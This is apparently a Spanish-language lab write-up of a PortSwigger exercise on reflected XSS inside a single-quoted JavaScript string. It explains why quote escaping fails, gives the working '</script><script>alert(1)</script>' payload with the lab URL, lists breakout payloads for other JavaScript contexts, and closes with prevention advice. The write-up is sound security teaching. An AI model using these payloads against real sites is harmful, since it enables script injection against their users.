# 🧪 Reflected XSS into a JavaScript string with single quote and backslash escaped

![Plataforma](https://img.shields.io/badge/Plataforma-PortSwigger-purple)
![Dificultad](https://img.shields.io/badge/Dificultad-Practitioner-yellow)
![Categoría](https://img.shields.io/badge/Categor%C3%ADa-Reflected%20XSS%20%7C%20JS%20Context-red)

## 📌 Resumen

Laboratorio de **PortSwigger Web Security Academy** que explota una
vulnerabilidad **Reflected XSS** en el buscador. El input se refleja
**dentro de una cadena de JavaScript** (entre comillas simples), y el
servidor **escapa las comillas simples y las barras invertidas**. Como no
se puede romper la cadena desde dentro, se rompe el **bloque `<script>`**
inyectando `</script>` para cerrarlo y abrir uno nuevo.

| Fase | Técnica | Resultado |
|------|---------|-----------|
| Análisis | Reflexión dentro de `<script>` | Contexto: JS string |
| Escape | `'` → `\'`, `\` → `\\` | No se puede romper la cadena |
| Bypass | `</script>` cierra el bloque | Inyectar nuevo `<script>` |
| Payload | `</script><script>alert(1)</script>` | ✅ Lab resuelto |

---

## 🎯 Objetivo

Romper la cadena de JavaScript y ejecutar `alert()`.

---

## 📖 Contexto: XSS en contexto JavaScript

Cuando el input del usuario se refleja **dentro de un bloque `<script>`**,
hay varios subcontextos posibles:

| Subcontexto | Ejemplo | Cómo romperlo |
|-------------|---------|---------------|
| **String (comillas simples)** | `var x = 'INPUT';` | `'; alert(1); //` |
| **String (comillas dobles)** | `var x = "INPUT";` | `"; alert(1); //` |
| **Template literal** | ``var x = `INPUT`;`` | `` `${alert(1)}` `` |
| **Código directo** | `var x = INPUT;` | `alert(1)` directo |
| **Comentario** | `// INPUT` | `\nalert(1)` |

En este lab, el subcontexto es **string con comillas simples**, pero el
servidor **escapa** las comillas y las barras invertidas. Eso bloquea
todos los intentos de romper la cadena **desde dentro**.

---

## 🔍 Análisis

### 1. Identificar la reflexión

Al buscar `test`, el servidor devuelve:

```html
<script>
var searchTerms = 'test';
document.write('<h1>...');
</script>
```

**Contexto:** dentro de una **cadena JavaScript** entre comillas simples.

### 2. Comprobar el escape

**Intento 1: romper la cadena con `'`**

Buscar `'` → el servidor devuelve `\'`.

```javascript
var searchTerms = '\'';
```

❌ La comilla está escapada. No rompe la cadena.

**Intento 2: escapar el escape con `\'`**

Buscar `\'` → el servidor devuelve `\\'`.

```javascript
var searchTerms = '\\\'';
```

❌ La barra invertida está escapada. No funciona.

**Conclusión:** no se puede romper la cadena **desde dentro** del string.

### 3. Cambiar de estrategia

El navegador parsea el HTML **antes** de ejecutar JavaScript. Cuando
encuentra `<script>`, busca el **primer `</script>`** para cerrar el
bloque, **sin importar** si está dentro de una cadena o no.

Eso significa que si inyectamos `</script>`, el navegador **cerrará el
bloque** aunque estemos "dentro" de una cadena JavaScript.

---

## 💥 Explotación

### 4. Construir el payload

```
</script><script>alert(1)</script>
```

**Desglose:**

| Parte | Función |
|-------|---------|
| `</script>` | Cierra el bloque `<script>` original (aunque esté dentro de una string). |
| `<script>` | Abre un nuevo bloque `<script>`. |
| `alert(1)` | Se ejecuta en el nuevo bloque. |
| `</script>` | Cierra el nuevo bloque (por limpieza). |

### 5. Cómo queda el HTML

Con el payload, el HTML resultante es:

```html
<script>
var searchTerms = '</script><script>alert(1)</script>';
document.write(...);
</script>
```

El navegador lo interpreta así:

1. `<script>` → inicia bloque.
2. `var searchTerms = '` → código JS.
3. **`</script>`** → **cierra el bloque** (ignora que está dentro de string).
4. `<script>alert(1)</script>` → **nuevo bloque**, ejecuta `alert(1)`.
5. `'; document.write(...);` → texto ignorado.

### 6. Ejecutar el ataque

Buscar el payload en el buscador:

```
</script><script>alert(1)</script>
```

O en la URL:

```
https://YOUR-LAB-ID.web-security-academy.net/?search=</script><script>alert(1)</script>
```

Se ejecuta `alert(1)` y el lab se marca como **Solved**.

---

## 📸 Evidencia

<img width="1156" height="511" alt="image" src="https://github.com/user-attachments/assets/e5e2e633-33cc-4969-9345-2f3564431152" />


---

## 🧠 Lecciones aprendidas

1. **El escape de comillas y barras invertidas no es suficiente.** Si no
   puedes romper la cadena desde dentro, puedes **romper el bloque
   `<script>` desde fuera**.
2. **El navegador parsea el HTML antes de ejecutar JavaScript.** Por eso
   `</script>` cierra el bloque aunque esté dentro de una string.
3. **XSS en contexto JavaScript tiene varios subcontextos**: string
   (simple/doble), template literal, código directo, comentario. Cada uno
   requiere un payload distinto.
4. **No te obsesiones con una técnica.** Si el escape te bloquea una vía,
   busca **otra vía**.
5. **El escape contextual** es la única defensa real. Escapar `<` y `>`
   en el HTML **previene** este ataque.

---

## 🛡️ ¿Cómo se previene?

1. **Escapar `<` y `>`** en el HTML antes de reflejar cualquier input.
   Eso convierte `</script>` en `&lt;/script&gt;` y el navegador lo trata
   como texto, no como etiqueta.
2. **Escapar el input según el contexto**:
   - En HTML: `<`, `>`, `&`, `"`, `'`.
   - En atributos: `"`, `'`.
   - En JavaScript: `\`, `'`, `"`, `\n`, `\r`, `</script>`.
3. **Usar `JSON.stringify()`** para pasar datos a JavaScript de forma segura.
4. **Content Security Policy (CSP)** que bloquee scripts inline.
5. **No reflejar input del usuario dentro de bloques `<script>`**.

---

## 🛠️ Herramientas utilizadas

- Navegador web
- Burp Suite (opcional)

---

## 📚 Referencias

- [PortSwigger - Reflected XSS into JavaScript string](https://portswigger.net/web-security/cross-site-scripting/contexts/lab-javascript-string-single-quote-backslash-escaped)
- [PortSwigger - XSS contexts](https://portswigger.net/web-security/cross-site-scripting/contexts)
- [OWASP - XSS Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html)

---

**Autor:** [Murmur](https://github.com/murmur403)
**Fecha:** 2026-10-12
